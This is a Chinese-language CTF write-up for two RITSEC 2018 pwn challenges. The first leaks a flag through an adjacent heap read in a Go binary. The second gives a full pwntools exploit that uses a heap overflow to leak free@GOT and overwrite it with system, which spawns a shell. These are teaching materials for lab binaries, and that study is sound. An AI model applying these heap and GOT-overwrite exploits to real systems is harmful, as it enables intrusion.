# Pwn
## Gimme sum fud
給了一個go語言編譯成的ELF64文件。

試運行。
```bash
$ ./pwn3
Gimme some bytes, I'm hangry...
1234567890
mmmmm...., your 1234567890
 is so good. Thanks. Bye.
```

用IDA打開，定位到`main_main`函數（對應go的main函數）。
```c
__int64 __fastcall main_main(__int64 a1, __int64 a2, int a3)
{
  __int128 v3; // ST00_16
  // ...
  __int128 v27; // [rsp+48h] [rbp-18h]
  void *retaddr; // [rsp+60h] [rbp+0h]

  while ( (unsigned __int64)&retaddr <= *(_QWORD *)(__readfsqword(0xFFFFFFF8) + 16) )
    runtime_morestack_noctxt(a1, a2);
  main__Cfunc_init(a1, a2, a3);
  main__Cfunc__CMalloc(a1, a2);
  main__Cfunc__CMalloc(a1, a2);
  *(_QWORD *)&v3 = &byte_4C55C2;  // 'flag.txt'
  *((_QWORD *)&v3 + 1) = 8LL;
  io_ioutil_ReadFile(a1, a2, v4, v5, v3);
  if ( v25 )
  {
    if ( v25 )
      v21 = *(_QWORD *)(v25 + 8);
    runtime_gopanic(a1);
    BUG();
  }
  main_main_func1(a1, v23, v26, v22, v6, v7, v22, v23, v24);
  *(_QWORD *)&v27 = &unk_4A37A0;
  *((_QWORD *)&v27 + 1) = &main_statictmp_1;
  fmt_Println(a1, v23, v8, v9, v10, v11);
  main__Cfunc_myGets(a1);
  fmt_Printf(a1, v23, v12, v13, v14, v15, (__int64)&unk_4C676C); // 'mmmm...., your '
  main__Cfunc_myPrint(a1);
  return fmt_Printf(a1, v23, v16, v17, v18, v19, (__int64)&unk_4C8010);  // ' is so good. Thanks. Bye.'
}
```

程序結合試運行情況看程序邏輯
1. init之後，連續兩個malloc(0x10, 0x64)，然後`io_ioutil_ReadFile`讀取flag.txt的內容。
1. `main_main_func1`後，第一個`fmt_Println`應該對應着"Gimme some bytes, I'm hangry..."
1. `main__Cfunc_myGets(a1)`對應着用戶輸入。
1. `fmt_Printf(a1, v23, v12, v13, v14, v15, (__int64)&unk_4C676C)`對應"mmmmm...., your ";
1. `main__Cfunc_myPrint(a1);` 打印用戶輸入。
1. return後的`fmt_Printf`對應一次輸出(" is so good. Thanks. Bye.")。

gdb動態調試。
1. `call io_ioutil_ReadFile`之後的棧楨：
    ```gdb
    0x000000c42005bf20│+0x0000: 0x00000000004c55c2  →  "flag.txtgo1.10.3no anodereadlinkrunnableruntime.sc[...]"	 ← $rsp
    0x000000c42005bf28│+0x0008: 0x0000000000000008
    0x000000c42005bf30│+0x0010: 0x000000c4200ae000  →  "RITSEC{NOT_THE_REAL_FLAG}"
    0x000000c42005bf38│+0x0018: 0x000000000000001a
    ```
    出現了本地flag.txt中的內容。
1. `call main.main.func1`之後的棧楨：
    ```gdb
    0x000000c42005bf20│+0x0000: 0x000000c4200ae000  →  "RITSEC{NOT_THE_REAL_FLAG}"	 ← $rsp
    0x000000c42005bf28│+0x0008: 0x000000000000001a
    0x000000c42005bf30│+0x0010: 0x000000000000021a
    0x000000c42005bf38│+0x0018: 0x0000000000563870  →  "RITSEC{NOT_THE_REAL_FLAG}"
    0x000000c42005bf40│+0x0020: 0x000000000000021a
    ...
    gef➤  heap chunk 0x563870
    Chunk(addr=0x563870, size=0x30, flags=PREV_INUSE)
    Chunk size: 48 (0x30)
    Usable size: 40 (0x28)
    Previous chunk size: 0 (0x0)
    PREV_INUSE flag: On
    IS_MMAPPED flag: Off
    NON_MAIN_ARENA flag: Off
    ```
    發現flag已經到了堆當中了。
1. `call main._Cfunc_myGets`之後的棧楨：
    ```gdb
    0x000000c42005bf20│+0x0000: 0x00000000005637e0  →  "1234567890"	 ← $rsp
    0x000000c42005bf28│+0x0008: 0x0000000000000001
    gef➤  dereference 0x5637e0 20
    0x00000000005637e0│+0x0000: "1234567890"
    0x00000000005637e8│+0x0008: 0x00000000000a3039 ("90"?)
    0x00000000005637f0│+0x0010: 0x0000000000000000
    0x00000000005637f8│+0x0018: 0x0000000000000071 ("q"?)
    0x0000000000563800│+0x0020: 0x0000000000000000
    ...
    0x0000000000563860│+0x0080: 0x0000000000000000
    0x0000000000563868│+0x0088: 0x0000000000000031 ("1"?)
    0x0000000000563870│+0x0090: "RITSEC{NOT_THE_REAL_FLAG}"
    0x0000000000563878│+0x0098: "OT_THE_REAL_FLAG}"
    gef➤  p/d 0x90
    $5 = 144
    ```
1. 用戶輸入內容在flag前面144個字節處。如果輸入內容爲143字節（比如`'A'*143`)後面還有一個回車(0x0a)，可將flag一併輸出。
    ```gdb
    gef➤  r
    Starting program: /home/lj/ctf-notes/201811--ritsec-ctf-2018/Pwn/01--fud/pwn3
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
    [New Thread 0x7ffff7d81700 (LWP 5180)]
    ...
    [New Thread 0x7ffff5d7d700 (LWP 5184)]
    Gimme some bytes, I'm hangry...
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    ─────────────────────────────────────────────────────────────────────────────── stack ────
    0x000000c42005bf20│+0x0000: 0x00000000005637e0  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"	 ← $rsp
    0x000000c42005bf28│+0x0008: 0x0000000000000001
    0x000000c42005bf30│+0x0010: 0x0000000000000001
    ───────────────────────────────────────────────────────────────────────── code:x86:64 ────
         0x492038 <main.main+216>  mov    rax, QWORD PTR [rsp+0x40]
         0x49203d <main.main+221>  mov    QWORD PTR [rsp], rax
         0x492041 <main.main+225>  call   0x491de0 <main._Cfunc_myGets>
     →   0x492046 <main.main+230>  lea    rax, [rip+0x3471f]        # 0x4c676c
         0x49204d <main.main+237>  mov    QWORD PTR [rsp], rax
    ──────────────────────────────────────────────────────────────────────────────────────────
    Thread 1 "pwn3" hit Breakpoint 3, 0x0000000000492046 in main.main ()
    gef➤  dereference 0x5637e0 20
    0x00000000005637e0│+0x0000: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
    ...
    0x0000000000563838│+0x0058: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
    0x0000000000563840│+0x0060: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nR[...]"
    0x0000000000563848│+0x0068: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nRITSEC{NO[...]"
    0x0000000000563850│+0x0070: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nRITSEC{NOT_THE_RE[...]"
    0x0000000000563858│+0x0078: "AAAAAAAAAAAAAAAAAAAAAAA\nRITSEC{NOT_THE_REAL_FLAG}"
    0x0000000000563860│+0x0080: "AAAAAAAAAAAAAAA\nRITSEC{NOT_THE_REAL_FLAG}"
    0x0000000000563868│+0x0088: "AAAAAAA\nRITSEC{NOT_THE_REAL_FLAG}"
    0x0000000000563870│+0x0090: "RITSEC{NOT_THE_REAL_FLAG}"
    0x0000000000563878│+0x0098: "OT_THE_REAL_FLAG}"
    gef➤  c
    Continuing.
    mmmmm...., your AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    RITSEC{NOT_THE_REAL_FLAG}
     is so good. Thanks. Bye.[Thread 0x7ffff5d7d700 (LWP 5184) exited]
     ...
    [Thread 0x7ffff7dc2740 (LWP 5179) exited]
    [Inferior 1 (process 5179) exited normally]
    ```

## Yet Another HR Management Framework
程序給了一個libc.so和一個pwn2文件，運行pwn2：
```bash
$ ./pwn2
Welcome to yet another human resources management framework!
============================================================
1. Create a new person
2. Edit a person
3. Print information about a person
4. Delete a person
5. This framework sucks, get me out of here!
Enter your choice:
```
明顯是一個堆溢出的題目。

flint後拖到IDA中，發現也是Go語言寫的。用Go語言寫的程序定位函數有些特殊，這裏我們僅關心那些用C語言實現的函數（函數列表中`main__Cfunc_XXXX`）。直接點擊上面的函數得到的是類似下面的輸出：
```c
int __cdecl main__Cfunc_createPerson(int a1)
{
  void *retaddr; // [esp+10h] [ebp+0h]

  while ( (unsigned int)&retaddr <= *(_DWORD *)(*(_DWORD *)(__readgsdword(0) - 4) + 8) )
    runtime_morestack_noctxt();
  a1 = 0;
  return runtime_cgocall(main__cgo_df1ab1e22195_Cfunc_createPerson[0], &a1);
}
```
需要點擊`main__cgo_df1ab1e22195_Cfunc_createPerson`到下面的地方：
```
.data:081910C0 main__cgo_df1ab1e22195_Cfunc_createPerson dd offset _cgo_df1ab1e22195_Cfunc_createPerson
.data:081910C0                                         ; DATA XREF: main__Cfunc_createPerson+2B↑r
```
然後點擊`_cgo_df1ab1e22195_Cfunc_createPerson`就可以定位到真正的函數體了：
```c
int __cdecl cgo_df1ab1e22195_Cfunc_createPerson(int a1)
{
  int v1; // esi
  int v2; // edi
  _DWORD *v3; // eax
  signed int v4; // edi
  int result; // eax

  v1 = cgo_topofstack();
  v2 = runtime_ebss;
  if ( runtime_ebss > 9u )
  {
    v4 = 1;
    puts("No more person for you.");
  }
  else
  {
    v3 = malloc(0xCu);
    *v3 = runtime_etext;
    p[v2] = v3;
    v4 = 0;
  }
  result = cgo_topofstack() - v1;
  *(_DWORD *)(a1 + result) = v4;
  return result;
}
```
從上面我們可以大概看出程序最多能創建10個person結構體，每個結構體大小爲12個字節。進一步點到`runtime_etext`可以看到：
```c
int __cdecl runtime_etext(int a1)
{
  __printf_chk(1, "Name: %s\n", *(_DWORD *)(a1 + 4));
  return __printf_chk(1, "Age: %u\n", *(_DWORD *)(a1 + 8));
}
```
於是猜測person結構體：
```c
struct person {
    void (*print)(struct person *p);
    char *name;
    unsigned int *age;
};
```

繼續閱讀代碼，可以得到下面的結果：
```c
int __cdecl cgo_df1ab1e22195_Cfunc_createPerson(int a1)
{
  int v1; // esi
  int n; // edi
  _DWORD *p; // eax
  signed int r; // edi
  int result; // eax

  v1 = cgo_topofstack();
  n = numPerson;
  if ( numPerson > 9u )
  {
    r = 1;
    puts("No more person for you.");
  }
  else
  {
    p = malloc(12u);
    *p = print;
    globalP[n] = p;  // globalP addr == 0x81a3ca0
    r = 0;
  }
  result = cgo_topofstack() - v1;
  *(_DWORD *)(a1 + result) = r;
  return result;
}

int __cdecl print(person *p)
{
  __printf_chk(1, "Name: %s\n", p->name);
  return __printf_chk(1, "Age: %u\n", p->age);
}

void __cdecl cgo_df1ab1e22195_Cfunc_deletePerson(int i)
{
  person *p; // esi

  p = (person *)globalP[*(_DWORD *)i];
  free(p->name);
  free(p);
}

struct go_buf_struct { void* buf; int len; };

ssize_t __cdecl cgo_df1ab1e22195_Cfunc_myGets(go_buf_struct *go_buf)
{
  return read(0, go_buf->buf, go_buf->len);
}
```
edit功能不是用C語言實現的，而是用Go實現的，對應`main_realEditPerson`函數，其中利用了`Cfunc_myGets`函數，並且沒有發現調用malloc的跡象。

到這裏可以猜測攻擊思路：如果可以利用堆溢出覆蓋後面person的print指針，那麼應該就可以實現`system('/bin/sh')`了。

Go語言實現的函數都比較複雜，難以靜態分析，下面轉入動態分析。
```gdb
gef➤  checksec
[+] checksec for '/home/lj/ctf-notes/201811--ritsec-ctf-2018/Pwn/02-HR/250/dist/pwn2'
Canary                        : Yes
NX                            : Yes
PIE                           : No
Fortify                       : Yes
RelRO                         : Partial  // 可以覆蓋GOT
gef➤  b main.printMenu
Breakpoint 1 at 0x804a350
gef➤  r
gef➤  c // 多按幾次直至出現菜單操作
Continuing.
Welcome to yet another human resources management framework!
============================================================
1. Create a new person
2. Edit a person
3. Print information about a person
4. Delete a person
5. This framework sucks, get me out of here!
Enter your choice: 1

Creating a new person...
Enter name length: 1
Enter person's name: a
Enter person's age: 1
gef➤  c // 多按幾次直至出現菜單操作
Continuing.
Welcome to yet another human resources management framework!
============================================================
1. Create a new person
2. Edit a person
3. Print information about a person
4. Delete a person
5. This framework sucks, get me out of here!
Enter your choice: 1

Creating a new person...
Enter name length: 2
Enter person's name: bb
Enter person's age: 2
gef➤  dereference 0x81a3ca0 2  // globalP
0x081a3ca0│+0x0000: 0x081a8370  →  0x080ebb10  →   push esi
0x081a3ca4│+0x0004: 0x081a8390  →  0x080ebb10  →   push esi
gef➤  dereference 0x81a8370 13
0x081a8370│+0x0000: 0x080ebb10  →   push esi
0x081a8374│+0x0004: 0x081a8380  →  0x00000a61 ("a"?)
0x081a8378│+0x0008: 0x00000001
0x081a837c│+0x000c: 0x00000011
0x081a8380│+0x0010: 0x00000a61 ("a"?)
0x081a8384│+0x0014: 0x00000000
0x081a8388│+0x0018: 0x00000000
0x081a838c│+0x001c: 0x00000011
0x081a8390│+0x0020: 0x080ebb10  →   push esi
0x081a8394│+0x0024: 0x081a83a0  →  0x000a6262 ("bb"?)
0x081a8398│+0x0028: 0x00000002
0x081a839c│+0x002c: 0x00000011
0x081a83a0│+0x0030: 0x000a6262 ("bb"?)
// ...370 p0 trunk
// ...380 p0->name trunk
// ...390 p1 trunk
// ...3a0 p1->name trunk

gef➤  b malloc
Breakpoint 2 at 0xf7e23e80 (2 locations)
gef➤  c // 多按幾次直至出現菜單操作
Continuing.
Welcome to yet another human resources management framework!
============================================================
1. Create a new person
2. Edit a person
3. Print information about a person
4. Delete a person
5. This framework sucks, get me out of here!
Enter your choice: 2

Editting a person...
Enter person's index (0-based): 0
Enter new name length: 20
Enter the new name: 12345678901234567890
Done.

Thread 1 "pwn2" hit Breakpoint 1, 0x0804a350 in main.printMenu ()  // 沒有觸發malloc斷點，沒有進行malloc
gef➤  dereference 0x81a3ca0 2
0x081a3ca0│+0x0000: 0x081a8370  →  0x080ebb10  →  <printPerson+0> push esi
0x081a3ca4│+0x0004: 0x081a8390  →  0x30393837  →  0x00000000
gef➤  dereference 0x81a8370 13
0x081a8370│+0x0000: 0x080ebb10  →  <printPerson+0> push esi
0x081a8374│+0x0004: 0x081a8380  →  0x34333231  →  0x00000000
0x081a8378│+0x0008: 0x00000001
0x081a837c│+0x000c: 0x00000011
0x081a8380│+0x0010: 0x34333231  →  0x00000000
0x081a8384│+0x0014: 0x38373635
0x081a8388│+0x0018: 0x32313039  →  0x00000000
0x081a838c│+0x001c: 0x36353433  →  0x00000000
0x081a8390│+0x0020: 0x30393837  →  0x00000000  // 實現了覆蓋print地址
0x081a8394│+0x0024: 0x081a83a0  →  0x000a6262 ("bb"?)
0x081a8398│+0x0028: 0x00000002
0x081a839c│+0x002c: 0x00000011
0x081a83a0│+0x0030: 0x000a6262 ("bb"?)
gef➤  c // 多按幾次直至出現菜單操作
Continuing.
Welcome to yet another human resources management framework!
============================================================
1. Create a new person
2. Edit a person
3. Print information about a person
4. Delete a person
5. This framework sucks, get me out of here!
Enter your choice: 3

Printing a person...
Enter person's index (0-based): 1

Thread 1 "pwn2" received signal SIGSEGV, Segmentation fault.
...
0x30393837 in ?? ()
gef➤  p/x $eip
$1 = 0x30393837
```

如果沒有開啓NX和ASLR，在上面動態調試的基礎上，將p0的name轉換爲如下payload：pad("A"*16)+addr(0x081a8390+4)+shellcode就可以了，但是本體中開啓了NX，服務器也十有八九開啓了ASLR，那麼：
1. 爲了應對NX，我們需要用ROP或者其他方法來繞過。
1. 爲了應對ASLR，我們需要泄露一個服務器上的地址。

注意到前面delete功能中free了兩次，第一次是free(name)，如果name='/bin/sh'，並且將free函數的地址改成system，那麼就成功得到shell。
爲了實現這個目的，可以通過修改GOT來實現。
```bash
$ objdump -R pwn2 | grep free
08191028 R_386_JUMP_SLOT   free@GLIBC_2.0
```
free@GOT=0x08191028，該地址處的值在程序運行時會被修改爲free@LIBC，我們將這個地方修改爲system@LIBC就可以了。

由於服務器開啓ASLR，我們可以將free@LIBC泄露出來。泄露信息當然用print函數，上面的調試過程中我們是將0x081a8390地址處的print地址覆蓋爲任意值，同樣，我們也可以將後面0x081a8394處的內容覆蓋，該內容爲指向字符串bb的地址，我們將其覆蓋爲free@GOT=0x08191028，然後就可以用print查看該地址處的值（free@LIBC）了。

得到free@LIBC後，根據其和system@LIBC的固定偏移量，即可得到後者，然後繼續利用edit功能，修改該地址處的值爲system@LIBC。

攻擊過程：
1. 創建p0(1, 'a', 0), p1(1, 'b', 1), p2(8, '/bin/sh', 2)
1. edit p0，將`p1->name`覆蓋爲free@GOT。注意覆蓋`p1->name`的同時要保證不改變前面的print地址（固定0x080ebb10）
1. print p0，得到free@LIBC，利用libc中free和system的固定偏移量，得到system@LIBC
1. edit p1，將name修改爲system@LIBC
1. free p2，觸發system('/bin/sh')

在本地運行時，由於本地libpthread與出題者用的庫不匹配，所以運行`LD_PRELOAD=./libc.so.6 LD_DEBUG=files ./pwn2`無法正確運行，但是將libc.so.6替換成本地的/lib32/libc.so.6可以正確運行和攻擊。

攻擊腳本如下
```python
from pwn import *

# context.log_level = 'debug'
# r = process('./pwn2', env={'LD_PRELOAD': './libc.so.6'})
r = process('./pwn2')

def add(length, name, age):
    r.sendlineafter('choice: ', '1')
    r.sendlineafter('length: ', '%d' % length)
    r.sendlineafter('name: ', name)
    r.sendlineafter('age: ', '%d' % age)

def edit(i, length, name):
    r.sendlineafter('choice: ', '2')
    r.sendlineafter('(0-based): ', '%d' % i)
    r.sendlineafter('length: ', '%d' % length)
    r.sendlineafter('name: ', name)

def show(i):
    r.sendlineafter('choice: ', '3')
    r.sendlineafter('(0-based): ', '%d' % i)
    r.recvuntil('Name: ')
    name = r.recvline()
    return name

def delete(i):
    r.sendlineafter('choice: ', '4')
    r.sendlineafter('(0-based): ', '%d' % i)

free_got = 0x08191028
print_add = 0x080ebb10
libc = ELF('/lib32/libc.so.6')
free = libc.symbols['free']
sys = libc.symbols['system']

add(1, 'a', 0)
add(1, 'b', 1)
add(8, '/bin/sh', 2)

edit(0, 24, 'A' * 16 + p32(print_add) + p32(free_got))
free_libc = u32(show(1)[:4])
gdb.attach(r)
print 'free@libc = 0x%08x' % free_libc
sys_libc = free_libc - free + sys
print 'system@libc = 0x%08x' % sys_libc

edit(1, 4, p32(sys_libc))
delete(2)
r.interactive()
```

### 純動態跟蹤分析方法
[這篇writeup](https://lordidiot.github.io/2018-11-18/ritsec-ctf-2018/#yet-another-hr-management-framework-pwn)使用了給malloc和free掛鉤子的方法來動態分析程序在何時調用malloc和free以及返回trunk的地址和大小，也很有借鑑意義。
